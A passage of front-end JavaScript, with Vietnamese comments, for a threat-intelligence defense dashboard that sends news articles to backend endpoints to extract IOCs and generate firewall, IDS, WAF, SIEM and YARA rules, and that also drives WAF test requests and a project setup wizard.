          body: JSON.stringify({ article_id: art.article_id, status: 'completed', processing_time_sec: durationSec })
        }).catch(() => {});

        renderHighlightedArticlesAndBuildProvenance([{ art, idx }]);
        renderNewsGrid();
        renderHistoryManager();

        // Tự động chuyển Section 3 sang chế độ Theo Bài Báo để người dùng thấy ngay điểm số mới được tính!
        await switchDefenseScope('SINGLE');
        applyArticleDefenseData(articleDefenseCache[art.article_id]);
      } catch (err) {
        status.textContent = `Lỗi bài #${idx + 1}: ` + err;
        updateLiveTicker(`Lỗi xử lý bài #${idx + 1}: ${err}`);
        art.status = 'pending';
        const hArtErr = allHistoryArticles.find(a => a.article_id === art.article_id);
        if (hArtErr) hArtErr.status = 'pending';
        fetch('/api/articles/update-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ article_id: art.article_id, status: 'pending', processing_time_sec: 0 })
        }).catch(() => {});
        renderHighlightedArticlesAndBuildProvenance([{ art, idx }]);
        renderNewsGrid();
        renderHistoryManager();

        // Tự động chuyển Section 3 sang chế độ Theo Bài Báo để người dùng thấy ngay điểm số mới được tính!
        await switchDefenseScope('SINGLE');
        applyArticleDefenseData(articleDefenseCache[art.article_id]);
      } finally {
        isQueueWorkerRunning = false;
        if (btn) {
          btn.disabled = false;
          btn.textContent = "Chạy Phân Tích";
        }
        if (autoQueueEnabled) {
          updateLiveTicker(`Chuyển tiếp bài tiếp theo trong hàng đợi sau 1.5s...`);
          setTimeout(() => {
            triggerNextInQueue();
          }, 1500);
        }
      }
    }

    async function runPipeline() {
      if (selectedIndices.length > 1) {
        await executeMergedArticlesPipeline();
      } else {
        await executeSingleArticleQueue(selectedIndices[0] || 0);
      }
    }

    async function executeMergedArticlesPipeline() {
      const btn = document.getElementById('btnRunAll');
      const status = document.getElementById('statusText');
      const text = document.getElementById('articleText').value;
      const modelSel = document.getElementById('aiModelSelect');
      const selectedModel = modelSel ? modelSel.value : 'khang-ai';
      if (btn) {
        btn.disabled = true;
        btn.textContent = "Đang xử lý...";
      }

      const startTime = performance.now();
      updateLiveTicker(`Bắt đầu phân tích gộp: "${(currentTitle || '').slice(0, 65)}..."`);

      selectedIndices.forEach(idx => {
        if (articles[idx]) {
          articles[idx].status = 'processing';
          fetch('/api/articles/update-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ article_id: articles[idx].article_id, status: 'processing', processing_time_sec: 0 })
          }).catch(() => {});
        }
      });
      renderNewsGrid();

      try {
        status.textContent = `Đang trích xuất IOC (${selectedModel})...`;
        setStageState(2, 'active', '', '', 40);

        const r2 = await fetch('/api/step2/extract-and-plan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: text, model_name: selectedModel })
        });
        const d2 = await r2.json();
        document.getElementById('aiPlanBox').textContent = d2.ai_plan;

        status.textContent = `Đang hợp nhất điểm ${d2.iocs.length} IOC qua 5 nguồn...`;
        setStageState(3, 'active', '', '', 75);

        const r3 = await fetch('/api/step3/khang-enrich-and-reason', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: text, iocs: d2.iocs, model_name: selectedModel })
        });
        const d3 = await r3.json();

        renderScoreTable(d3.all_enriched);
        document.getElementById('aiReasonBox').textContent = d3.ai_reasoning;
        window.latestMaliciousIocs = d3.malicious_only || [];

        status.textContent = `Đang sinh 5 lớp quy tắc phòng thủ...`;
        const r4 = await fetch('/api/step4/correlate-and-generate-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            title: currentTitle || "Báo cáo CTI",
            text: text,
            malicious_iocs: d3.malicious_only,
            model_name: selectedModel
          })
        });
        const d4 = await r4.json();

        window.latestFirewallText = d4.firewall_tab_text || "";
        if (d4.agentic_skill_md) document.getElementById('outSkillMd').textContent = d4.agentic_skill_md;
        if (d4.trust_audit) renderTrustAuditView(d4.trust_audit);
        if (d4.xai_audit) renderXAIExplanationView(d4.xai_audit);
        document.getElementById('outHistory').textContent = d4.history_and_summary;
        document.getElementById('outFirewall').textContent = d4.firewall_tab_text;
        document.getElementById('outSuricata').textContent = d4.suricata_rules;
        document.getElementById('outWaf').textContent = d4.waf_rules;
        document.getElementById('outSigma').textContent = d4.sigma_and_siem;
        document.getElementById('outYara').textContent = d4.yara_remediation_stix;

        const durationSec = parseFloat(((performance.now() - startTime) / 1000).toFixed(1));
        setStageState(4, 'done', '', '', 100);
        status.textContent = `Hoàn tất: ${d2.iocs.length} IOC (${d3.malicious_only.length} IOC bị chặn >80) trong ${durationSec}s.`;

        const nowIso = new Date().toISOString().replace('T', ' ').slice(0, 19);
        selectedIndices.forEach(idx => {
          if (articles[idx]) {
            articles[idx].status = 'completed';
            articles[idx].processing_time_sec = durationSec;
            articles[idx].last_analyzed_at = nowIso;

            articleDefenseCache[articles[idx].article_id] = {
              history: d4.history_and_summary,
              firewall: d4.firewall_tab_text,
              suricata: d4.suricata_rules,
              waf: d4.waf_rules,
              sigma: d4.sigma_and_siem,
              yara: d4.yara_remediation_stix,
              skill_md: d4.agentic_skill_md,
              trust_audit: d4.trust_audit,
              xai_audit: d4.xai_audit,
              score: d3.all_enriched,
              plan: d2.ai_plan,
              reason: d3.ai_reasoning
            };

            const hArt = allHistoryArticles.find(a => a.article_id === articles[idx].article_id);
            if (hArt) {
              hArt.status = 'completed';
              hArt.processing_time_sec = durationSec;
              hArt.last_analyzed_at = nowIso;
            } else {
              allHistoryArticles.unshift(Object.assign({}, articles[idx]));
            }

            fetch('/api/articles/update-status', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ article_id: articles[idx].article_id, status: 'completed', processing_time_sec: durationSec })
            }).catch(() => {});
          }
        });
        renderNewsGrid();
        renderHistoryManager();
      } catch (err) {
        status.textContent = "Lỗi: " + err;
      } finally {
        if (btn) {
          btn.disabled = false;
          btn.textContent = "Chạy Phân Tích";
        }
      }
    }

    async function syncLocalFirewall(actionMode) {
      const outEl = document.getElementById('outFirewall');
      const applyBtn = document.getElementById('btnFwApply');
      if (applyBtn) applyBtn.disabled = true;
      try {
        const res = await fetch('/api/firewall/sync', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: actionMode,
            malicious_iocs: window.latestMaliciousIocs || []
          })
        });
        const data = await res.json();
        outEl.textContent = data.execution_report + "\n\n" + (window.latestFirewallText || "");
      } catch (e) {
        alert("Lỗi Firewall Bridge: " + e);
      } finally {
        if (applyBtn) applyBtn.disabled = false;
      }
    }

    let lastKnownSyncTimestamp = 0;

    async function fetchLiveDefenseStatus() {
      try {
        const res = await fetch('/api/defense/live-status');
        if (!res.ok) return;
        const data = await res.json();
        
        // 1. Kiểm tra sự kiện Hot-Reload thời gian thực
        if (data.last_sync_timestamp) {
          if (lastKnownSyncTimestamp > 0 && data.last_sync_timestamp > lastKnownSyncTimestamp) {
            logToLiveTerminal("AUTO-SYNC BUS EVENT", `[HOT-RELOAD THỜI GIAN THỰC] AI Agent vừa nạp tri thức mới! Đã tự động tái nạp và phân phối cấu hình cho cả 5 công cụ phòng thủ (Nguồn: ${data.latest_sync_message || 'CTI Pipeline'}).`);
            masterDefenseCache = null;
            if (currentDefenseViewMode === 'MASTER') {
              loadMasterDefenseMatrix();
            }
          }
          lastKnownSyncTimestamp = data.last_sync_timestamp;
        }

        // 2. Cập nhật thanh Real-Time Auto-Sync Bus
        const badgeSyncTime = document.getElementById('badgeLastSyncTime');
        const badgeSyncCounter = document.getElementById('badgeSyncCounter');
        const autoSyncTrigger = document.getElementById('autoSyncTrigger');
        if (badgeSyncTime && data.last_sync_time_str) {
          badgeSyncTime.textContent = `Vừa nạp: ${data.last_sync_time_str}`;
        }
        if (badgeSyncCounter && data.sync_counter) {
          badgeSyncCounter.textContent = `Đồng bộ: #${data.sync_counter}`;
        }
        if (autoSyncTrigger && data.latest_sync_message) {
          autoSyncTrigger.textContent = data.latest_sync_message;
          autoSyncTrigger.title = data.latest_sync_message;
        }

        // 3. Cập nhật các chỉ số engine
        const engGrid = document.getElementById('liveEnginesGrid');
        if (engGrid && data.engines) {
          let html = '';
          const engs = [
            { key: 'windows_firewall', name: '1. Windows Defender Firewall', file: 'apply_firewall.bat', desc: '151 IP C2 Inbound/Outbound netsh rules' },
            { key: 'waf_modsecurity', name: '2. WAF ModSecurity v3 (Port 8766)', file: 'cti_virtual_patching.conf', desc: '969 CVE Virtual Patches (Active L7 Proxy)' },
            { key: 'suricata_ips', name: '3. Suricata IPS DPI Engine', file: 'cti_autonomous_master.rules', desc: '151 IPs, 180 C2 Domains, 30 CVE signatures' },
            { key: 'wazuh_siem', name: '4. Wazuh SIEM & Sysmon', file: 'local_rules.xml', desc: 'Process Injection & WebShell Anomaly Detection' },
            { key: 'yara_edr', name: '5. YARA In-Memory & AppLocker', file: 'malware_hunting.yar', desc: '50 Malicious File/Memory Hashes (SHA256/MD5)' }
          ];
          engs.forEach(e => {
            const info = data.engines[e.key] || {};
            const szKb = info.size_bytes ? (info.size_bytes / 1024).toFixed(1) + ' KB' : '0 KB';
            html += `
              <div style="background:var(--bg-subtle); border:1px solid var(--border-main); border-radius:6px; padding:12px;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
                  <b style="font-size:12.5px; color:var(--text-main);">${e.name}</b>
                  <span style="font-size:10.5px; font-weight:600; padding:2px 6px; background:var(--safe-bg); color:var(--safe); border:1px solid var(--safe-border); border-radius:3px;">CONNECTED</span>
                </div>
                <div style="font-size:11.5px; color:var(--text-muted); font-family:var(--font-mono); margin-bottom:4px;">File: ${e.file} (${szKb})</div>
                <div style="font-size:12px; color:var(--text-main);">${e.desc}</div>
              </div>
            `;
          });
          engGrid.innerHTML = html;
        }

        // 4. Cập nhật số liệu thống kê 3 năm
        if (data.year_stats) {
          const y24El = document.getElementById('statYear2024');
          const y25El = document.getElementById('statYear2025');
          const y26El = document.getElementById('statYear2026');
          const totEl = document.getElementById('statYearTotal');
          if (y24El) y24El.textContent = data.year_stats['2024'] || '1,948';
          if (y25El) y25El.textContent = data.year_stats['2025'] || '2,094';
          if (y26El) y26El.textContent = data.year_stats['2026'] || '3,216';
          if (totEl) totEl.textContent = data.year_stats['total'] || '7,258';
        }

        // 5. Cập nhật bảng nhật ký tấn công gần đây
        const tbody = document.getElementById('wafAttackLogsBody');
        if (tbody && data.recent_blocked_attacks) {
          if (data.recent_blocked_attacks.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="padding:10px; text-align:center; color:var(--text-muted);">Chưa có sự cố tấn công nào gần đây. Hãy nhấn các nút thử nghiệm ở trên!</td></tr>';
          } else {
            tbody.innerHTML = data.recent_blocked_attacks.map(att => `
              <tr style="border-bottom:1px solid var(--border-main);">
                <td style="padding:6px 8px; font-family:var(--font-mono); font-size:11px;">${att.timestamp}</td>
                <td style="padding:6px 8px; font-family:var(--font-mono); font-size:11px;">${att.client_ip}</td>
                <td style="padding:6px 8px; font-weight:600; color:var(--primary); font-size:11.5px;">${att.method}</td>
                <td style="padding:6px 8px; font-family:var(--font-mono); font-size:11.5px; max-width:220px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${att.path}">${att.path}</td>
                <td style="padding:6px 8px; font-size:11.5px; color:var(--danger); font-weight:600;">${att.cve_protected} - ${att.description}</td>
                <td style="padding:6px 8px;"><span style="background:var(--danger-bg); color:var(--danger); border:1px solid var(--danger-border); font-size:10.5px; font-weight:700; padding:2px 6px; border-radius:3px;">403 DROP</span></td>
              </tr>
            `).join('');
          }
        }
      } catch (e) {
        console.error("Lỗi lấy live defense status:", e);
      }
    }

    async function testWafAttack(type) {
      const consoleEl = document.getElementById('wafLiveConsole');
      if (consoleEl) {
        consoleEl.textContent = `[CTI SECURITY TESTER] Đang gửi gói tin thử nghiệm '${type}' tới WAF Reverse Proxy (http://127.0.0.1:8766)...`;
      }
      try {
        const res = await fetch('/api/defense/test-waf-attack', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ attack_type: type })
        });
        const d = await res.json();
        if (consoleEl) {
          const statusColor = d.status_code === 403 ? 'CHẶN ĐỨNG (403 FORBIDDEN - DROP PAYLOAD)' : 'THÔNG QUA (200 OK - CLEAN TRAFFIC)';
          const logTxt = [
            `+-------------------------------------------------------------------------------------------------+`,
            `| KẾT QUẢ KIỂM THỬ THỜI GIAN THỰC QUA MÁY CHỦ WAF MODSECURITY V3 (CỔNG 8766)                      |`,
            `+-------------------------------------------------------------------------------------------------+`,
            `* Thời gian phản hồi   : ${d.response_time_ms} ms`,
            `* Mục tiêu kiểm thử    : ${d.target_url}`,
            `* Mô tả Payload / CVE  : ${d.payload_desc}`,
            `* Trạng thái phản hồi  : HTTP ${d.status_code} -> ${statusColor}`,
            `* WAF Engine Header    : ${d.headers ? (d.headers['x-waf-protection-engine'] || d.headers['X-Waf-Protection-Engine'] || 'OpenClaw-CTI-ModSecurity-v3') : 'Active'}`,
            `* Body JSON chi tiết   :`,
            JSON.stringify(d.response_body, null, 2),
            `+-------------------------------------------------------------------------------------------------+`
          ].join('\n');
          consoleEl.textContent = logTxt;
        }
        await fetchLiveDefenseStatus();
      } catch (e) {
        if (consoleEl) consoleEl.textContent = `[LỖI GỬI GÓI TIN KIỂM THỬ WAF]: ${e}`;
      }
    }

    async function recompileAllDefenseEngines() {
      const consoleEl = document.getElementById('wafLiveConsole');
      if (consoleEl) consoleEl.textContent = `[AI AGENT COMPILER] Đang đọc toàn bộ 1,695 bài báo và CVE từ SQLite để tái biên dịch 5 công cụ an ninh...`;
      try {
        const res = await fetch('/api/defense/recompile-all', { method: 'POST' });
        const d = await res.json();
        if (consoleEl) {
          consoleEl.textContent = `[HOÀN TẤT BIÊN DỊCH VÀ ĐỒNG BỘ 5 ENGINE PHÒNG THỦ]\n` + JSON.stringify(d, null, 2);
        }
        await fetchLiveDefenseStatus();
      } catch (e) {
        if (consoleEl) consoleEl.textContent = `[LỖI BIÊN DỊCH]: ${e}`;
      }
    }

    function showCliControlModal() {
      alert(
        "TRUNG TÂM ĐIỀU KHIỂN DÒNG LỆNH (CTI AGENTIC DEFENSE CLI)\n\n" +
        "Hệ thống hiện đang vận hành dưới dạng CLI Controller chuyên nghiệp:\n" +
        "• Khởi động: cti-defense (hoặc cti)\n" +
        "• Dừng an toàn & giải phóng GPU: Nhấn Ctrl+C trong Terminal (hoặc chạy: cti-defense stop)\n" +
        "• Kiểm tra trạng thái: cti-defense status\n" +
        "• Mở lại giao diện Web: Nhấn phím [o] hoặc [Enter] ngay trong Terminal."
      );
    }

    async function shutdownSystem() {
      try {
        fetch('/api/system/shutdown', { method: 'POST' }).catch(() => {});
      } catch (e) {}
      document.body.innerHTML = `
        <div style="min-height:100vh; display:flex; align-items:center; justify-content:center; background:#f8fafc; color:#0f172a; font-family:'Inter',sans-serif; padding:24px;">
          <div style="border:1px solid #cbd5e1; background:#ffffff; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.06); padding:36px 42px; max-width:560px; text-align:center;">
            <h2 style="color:#0f172a; margin-bottom:12px; font-weight:700;">HỆ THỐNG ĐÃ DỪNG AN TOÀN</h2>
            <p style="color:#475569; line-height:1.6; font-size:14px;">
              Tiến trình Web và GPU Server đã được giải phóng bộ nhớ.<br/>
              Để khởi động lại hệ thống, mở Terminal và chạy lệnh:<br/>
              <code style="display:inline-block; margin-top:8px; background:#0f172a; color:#4ade80; padding:6px 16px; border-radius:6px; font-family:monospace; font-weight:700; font-size:14px;">cti-defense</code>
            </p>
          </div>
        </div>
      `;
    }

    window.addEventListener('DOMContentLoaded', async () => {
      await loadHardwareAndModels();
      startBackgroundCountdown();
      await loadArticles('ALL', false);
      await loadMasterDefenseMatrix();
      switchDefenseScope('MASTER');
      fetchLiveDefenseStatus();
      setInterval(fetchLiveDefenseStatus, 3500);
      await initProjectContext();
    });
  
    // =========================================================================
    // WIZARD INTERACTIVE CONTROLLER JAVASCRIPT
    // =========================================================================
    let wzCurrentStep = 1;
    let wzTarget = "./target_projects/My_Website";
    let wzScopeId = "SCOPE_WEB";
    let wzBestArticleId = "thn-79d0e8ee";
    let wzSkillName = "agentic-defense-cve-2026-php2shell";
    let detectedSystemModelData = null;
    let wzScanCompleted = false;

    function toggleStep1AdvancedOptions() {
      const drawer = document.getElementById("step1AdvancedDrawer");
      const link = document.getElementById("toggleStep1OptLink");
      if (!drawer) return;
      if (drawer.style.display === "none" || !drawer.style.display) {
        drawer.style.display = "block";
        if (link) link.textContent = "[-] Thu gọn tùy chọn nâng cao";
      } else {
        drawer.style.display = "none";
        if (link) link.textContent = "[+] Tùy chọn nâng cao: Đổi thư mục hoặc dán link Git";
      }
    }

    function toggleLandingAdvancedOptions() {
      const drawer = document.getElementById("landingAdvancedDrawer");
      const link = document.getElementById("toggleLandingOptLink");
      if (!drawer) return;
      if (drawer.style.display === "none" || !drawer.style.display) {
        drawer.style.display = "block";
        if (link) link.textContent = "[-] Thu gọn tùy chọn nâng cao";
      } else {
        drawer.style.display = "none";
        if (link) link.textContent = "[+] Tùy chọn nâng cao: Thay đổi thư mục mã nguồn hoặc dán link Git";
      }
    }

    function wizardStartFromLanding() {
      wizardGotoStep(1);
      wizardExecuteStep1();
    }

    async function initProjectContext() {
      const urlParams = new URLSearchParams(window.location.search);
      let queryTarget = urlParams.get('target') || '';
      if (!queryTarget) {
        queryTarget = localStorage.getItem('cti_last_target') || '';
      }
      try {
        const res = await fetch('/api/system/project-context?target=' + encodeURIComponent(queryTarget));
        const data = await res.json();
        if (data && data.target_path) {
          wzTarget = data.target_path;
          localStorage.setItem('cti_last_target', data.target_path);

          const targetInp = document.getElementById('wizardInputTarget');
          if (targetInp) targetInp.value = data.target_path;
          if (typeof validateTargetFolder === 'function') validateTargetFolder(data.target_path);

          const s1Target = document.getElementById('step1TargetName');
          const s1Path = document.getElementById('step1TargetPath');
          if (s1Target) s1Target.textContent = data.target_name || 'Dự Án Mã Nguồn';
          if (s1Path) s1Path.textContent = data.target_path || wzTarget;

          if (detectedSystemHardware) {
            const lGpu = document.getElementById('landingGpuName');
            const lCpu = document.getElementById('landingCpuName');
            const lRam = document.getElementById('landingRam');
            const lTier = document.getElementById('landingTierBadge');
            if (lGpu) lGpu.textContent = detectedSystemHardware.gpu_name + (detectedSystemHardware.vram_gb ? ' (' + detectedSystemHardware.vram_gb + 'GB VRAM)' : '');
            if (lCpu) lCpu.textContent = detectedSystemHardware.cpu_name || 'CPU Đa Nhân';
            if (lRam) lRam.textContent = (detectedSystemHardware.ram_gb || 16.0) + ' GB';
            if (lTier) lTier.textContent = (detectedSystemHardware.tier_title || 'CẤU HÌNH TIÊU CHUẨN').toUpperCase();
          }

          const isConfigured = Boolean(
            (data.is_configured && data.config) || 
            (localStorage.getItem('cti_configured_' + data.target_path) === 'true')
          );

          if (isConfigured) {
            wzIsProjectConfigured = true;
            localStorage.setItem('cti_configured_' + data.target_path, 'true');

            // Xóa triệt để landing-mode và wizard-setup-mode
            document.body.classList.remove('wizard-setup-mode');
            document.body.classList.remove('landing-mode');

            // Ẩn wizardCard0 và sec-wizard
            const card0 = document.getElementById('wizardCard0');
            if (card0) card0.style.display = 'none';
            const secWizard = document.getElementById('sec-wizard');
            if (secWizard) secWizard.style.display = 'none';

            wzCurrentStep = 5;

            if (data.config && data.config.scope_id) {
              wzScopeId = data.config.scope_id;
              if (typeof switchDefenseScope === 'function') switchDefenseScope(data.config.scope_id);
            }
            if (data.config && data.config.scan_interval_sec) {
              serverScanInterval = data.config.scan_interval_sec;
              const delaySelect = document.getElementById('scanDelayInput');
              if (delaySelect) delaySelect.value = String(data.config.scan_interval_sec);
              const wzCadence = document.getElementById('wzCadenceSelect');
              if (wzCadence) wzCadence.value = String(data.config.scan_interval_sec);
            }
            const autoScanControls = document.getElementById('autoScanStripControls');
            const autoScanMsg = document.getElementById('autoScanPendingMsg');
            if (autoScanControls) autoScanControls.style.display = 'flex';
            if (autoScanMsg) autoScanMsg.style.display = 'none';

            renderProjectDefenseHeader(data);

            // Hiện các khu vực giám sát trực tiếp Live AI
            const feedSec = document.getElementById('sec-feed');
            if (feedSec) feedSec.style.display = 'block';
            const histSec = document.getElementById('sec-history');
            if (histSec) histSec.style.display = 'block';
            const scoreSec = document.getElementById('sec-score');
            if (scoreSec) scoreSec.style.display = 'block';
            const defSec = document.getElementById('sec-defense');
            if (defSec) defSec.style.display = 'block';

            // Kích hoạt tab "Tất Cả" để người dùng xem trực tiếp Live AI
            const allNavBtn = document.querySelectorAll('.NavLinks .NavLink')[1];
            switchView('all', allNavBtn);
          } else {
            wzIsProjectConfigured = false;
            const container = document.getElementById('projectContextContainer');
            if (container) container.innerHTML = '';

            const autoScanControls = document.getElementById('autoScanStripControls');
            const autoScanMsg = document.getElementById('autoScanPendingMsg');
            if (autoScanControls) autoScanControls.style.display = 'none';
            if (autoScanMsg) autoScanMsg.style.display = 'inline-flex';

            const lTarget = document.getElementById('landingTargetName');
            const lPath = document.getElementById('landingTargetPath');
            if (lTarget) lTarget.textContent = data.target_name || 'Dự Án Mục Tiêu';
            if (lPath) lPath.textContent = data.target_path || wzTarget;
            const lHwSum = document.getElementById('landingHardwareSummary');
            if (lHwSum && detectedSystemHardware) {
              lHwSum.textContent = detectedSystemHardware.gpu_name + ' (' + (detectedSystemHardware.vram_gb || 8) + 'GB VRAM) • Chờ khảo sát & chọn model tại Bước 2';
            }

            document.body.classList.add('landing-mode');
            switchView('sec-wizard', document.querySelector('.NavLinks .NavLink'));
            wizardGotoStep(0);
          }
        } else {
          switchView('sec-wizard', document.querySelector('.NavLinks .NavLink'));
          wizardGotoStep(0);
        }
      } catch (e) {
        console.error('Loi khoi tao ngu canh du an:', e);
        switchView('sec-wizard', document.querySelector('.NavLinks .NavLink'));
        wizardGotoStep(0);
      }
    }

    function renderProjectDefenseHeader(data) {
      const container = document.getElementById('projectContextContainer');
      if (!container) return;

      if ((data.is_configured && data.config) || wzIsProjectConfigured) {
        const cfg = data.config || {};
        const cadenceSec = cfg.scan_interval_sec || serverScanInterval || 21600;
        const cadenceLabel = (cadenceSec >= 3600) 
          ? `Quét định kỳ ${Math.round(cadenceSec / 3600)} tiếng / lần`
          : `Quét ${Math.round(cadenceSec / 60)} phút / lần`;

        container.innerHTML = `
          <div style="background:#f0fdf4; border:1px solid #86efac; border-radius:6px; padding:12px 18px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; margin-bottom:14px;">
            <div>
              <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px;">
                <span style="background:#15803d; color:#ffffff; font-weight:700; font-size:11px; padding:2px 8px; border-radius:3px;">DỰ ÁN ĐÃ BẢO VỆ (LIVE MONITORING)</span>
                <span style="font-weight:700; color:#0f172a; font-size:14px;">${data.target_name || (wzTarget ? wzTarget.split(/[/\\]/).pop() : 'testCTI')}</span>
                <span style="font-family:monospace; color:#475569; font-size:12px;">(${data.target_path || wzTarget})</span>
              </div>
              <div style="font-size:12px; color:#166534;">
                Phân hệ: <b>${cfg.scope_name || cfg.scope_id || 'Scope A: Web & API Layer'}</b> &bull; Gói Kỹ Năng Tác Tử: <b style="font-family:monospace;">${cfg.skill_name || 'agentic-defense-master-web-suite'}</b> &bull; Chu kỳ: <b>${cadenceLabel}</b> &bull; Trạng thái: <b style="color:#15803d;">LIVE MONITORING (ĐANG BẢO VỆ)</b>
              </div>
            </div>
            <div style="display:flex; gap:8px; align-items:center;">
              <button type="button" class="CleanBtn" style="font-size:12px; padding:6px 14px; background:#eff6ff; color:#1d4ed8; border:1px solid #bfdbfe; border-radius:4px; font-weight:600; cursor:pointer;" onclick="openWizardReview(5)">
                [ Xem Quy Trình Wizard ]
              </button>
              <button type="button" class="CleanBtn" style="font-size:12px; padding:6px 14px; background:#2563eb; color:#ffffff; border:none; border-radius:4px; font-weight:600; cursor:pointer;" onclick="switchView('all', document.querySelectorAll('.NavLinks .NavLink')[1])">
                [ Giám Sát Trực Tiếp Live AI ]
              </button>
              <button type="button" class="CleanBtn" style="font-size:12px; padding:6px 14px; background:#fee2e2; color:#b91c1c; border:1px solid #fca5a5; border-radius:4px; font-weight:600; cursor:pointer;" onclick="resetProjectDefense()">
                [ Thiết Lập Lại / Quét Lại Dự Án ]
              </button>
            </div>
          </div>
        `;
      } else {
        container.innerHTML = '';
      }
    }

    function openWizardReview(step = 5) {
      const wizNav = document.querySelectorAll('.NavLinks .NavLink')[0];
      switchView('sec-wizard', wizNav);
      const card0 = document.getElementById('wizardCard0');
      if (card0) card0.style.display = 'none';
      wizardGotoStep(step);
      const secWizard = document.getElementById('sec-wizard');
      if (secWizard) secWizard.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }

    function finishWizardAndOpenLiveMonitoring() {
      wzIsProjectConfigured = true;
      localStorage.setItem('cti_configured_' + wzTarget, 'true');
      document.body.classList.remove('wizard-setup-mode', 'landing-mode');
      const card0 = document.getElementById('wizardCard0');
      if (card0) card0.style.display = 'none';
      const secWizard = document.getElementById('sec-wizard');
      if (secWizard) secWizard.style.display = 'none';
      const allNavBtn = document.querySelectorAll('.NavLinks .NavLink')[1];
      switchView('all', allNavBtn);
      initProjectContext();
    }

    async function resetProjectDefense() {
      if (!confirm("Bạn có chắc chắn muốn đặt lại cấu hình phòng thủ để quét lại dự án từ đầu không?")) return;
      try {
        localStorage.removeItem('cti_configured_' + wzTarget);
        localStorage.removeItem('cti_last_target');
        document.documentElement.classList.remove('project-is-configured');
        document.body.classList.remove('project-is-configured');
        const res = await fetch('/api/system/project-reset', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ target_path: wzTarget })
        });
        const d = await res.json();
        wzIsProjectConfigured = false;

        // Chuyển thẳng về màn hình Landing / Bắt đầu từ đầu
        document.body.classList.add('landing-mode');
        document.body.classList.remove('wizard-setup-mode');
        const card0 = document.getElementById('wizardCard0');
        if (card0) card0.style.display = 'block';
        const stepperNav = document.getElementById('wizardStepperNav');
        if (stepperNav) stepperNav.style.display = 'none';
        for (let i = 1; i <= 6; i++) {
          const c = document.getElementById('wizardCard' + i);
          if (c) c.style.display = 'none';
        }
        const secWizard = document.getElementById('sec-wizard');
        if (secWizard) {
          secWizard.style.display = 'block';
          secWizard.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
        const navWiz = document.querySelectorAll('.NavLinks .NavLink')[0];
        if (navWiz) switchView('sec-wizard', navWiz);
        wzCurrentStep = 0;
        await initProjectContext();
      } catch (e) {
        alert("Lỗi đặt lại: " + e);
      }
    }

        function startLandingScan() {
      document.body.classList.remove('landing-mode');
      const card0 = document.getElementById('wizardCard0');
      if (card0) card0.style.display = 'none';

      const stepperNav = document.getElementById('wizardStepperNav');
      if (stepperNav) stepperNav.style.display = 'flex';

      const wizardLegend = document.getElementById('wizardBoxLegend');
      if (wizardLegend) wizardLegend.style.display = 'block';

      const wizardBox = document.getElementById('sec-wizard');
      if (wizardBox) {
        wizardBox.style.border = '';
        wizardBox.style.background = '';
        wizardBox.style.padding = '';
        wizardBox.style.boxShadow = '';
      }

      wizardGotoStep(1);
      setTimeout(() => {
        wizardExecuteStep1();
      }, 150);
    }

let wzIsProjectConfigured = false;

    function wizardGotoStep(stepNum) {
      if (wzIsProjectConfigured && stepNum === 0) {
        stepNum = 1;
      }
      wzCurrentStep = stepNum;
      
      // Chi hien cac tab dieu huong va khong gian Live Server khi vao Buoc 5 tro di hoac du an da bao ve
      const isLiveStage = (stepNum >= 5 || wzIsProjectConfigured);
      if (isLiveStage) {
        document.body.classList.remove("wizard-setup-mode");
      } else {
        document.body.classList.add("wizard-setup-mode");
      }

      // An toan bo khong gian Live Server o cac buoc khoi tao (Buoc 0 den 4), chi hien thi khi toi Buoc 5
      const feedSec = document.getElementById('sec-feed');
      if (feedSec) feedSec.style.display = isLiveStage ? 'block' : 'none';
      const histSec = document.getElementById('sec-history');
      if (histSec) histSec.style.display = isLiveStage ? 'block' : 'none';
      const scoreSec = document.getElementById('sec-score');
      if (scoreSec) scoreSec.style.display = isLiveStage ? 'block' : 'none';
      const defSec = document.getElementById('sec-defense');
      if (defSec) defSec.style.display = isLiveStage ? 'block' : 'none';

      const stepperNav = document.getElementById("wizardStepperNav");
      if (stepperNav) {
        stepperNav.style.display = (stepNum === 0) ? "none" : "flex";
      }

      const card0 = document.getElementById("wizardCard0");
      if (card0) {
        if (wzIsProjectConfigured) {
          card0.style.display = "none";
        } else {
          card0.style.display = (stepNum === 0) ? "block" : "none";
        }
      }

      for (let i = 1; i <= 6; i++) {
        const card = document.getElementById("wizardCard" + i);
        const badge = document.getElementById("stepBadge" + i);
        if (card) card.style.display = (i === stepNum) ? "block" : "none";
        if (badge) {
          if (i === stepNum) {
            badge.style.background = "#2563eb";
            badge.style.color = "#ffffff";
            badge.style.fontWeight = "700";
          } else if (i < stepNum) {
            badge.style.background = "#dcfce7";
            badge.style.color = "#15803d";
            badge.style.fontWeight = "600";
          } else {
            badge.style.background = "#e2e8f0";
            badge.style.color = "#475569";
            badge.style.fontWeight = "600";
          }
        }
      }

      if (stepNum === 2) {
        renderHardwareModelSelector();
      } else if (stepNum === 3) {
        syncScopeSelectorUI();
      } else if (stepNum === 4) {
        renderAdaptiveCadence(wzScopeId);
      } else if (stepNum === 5) {
        const wzCadence = document.getElementById('wzCadenceSelect');
        if (wzCadence && wzCadence.value) {
          onWizardCadenceChange(wzCadence.value);
        }
        // Hien thi truc tiep khong gian Live Server nguyen ban (Nguon bao highlight + Lich su da hoc)
        const feedSec = document.getElementById('sec-feed');
        if (feedSec) feedSec.style.display = 'block';
        const histSec = document.getElementById('sec-history');
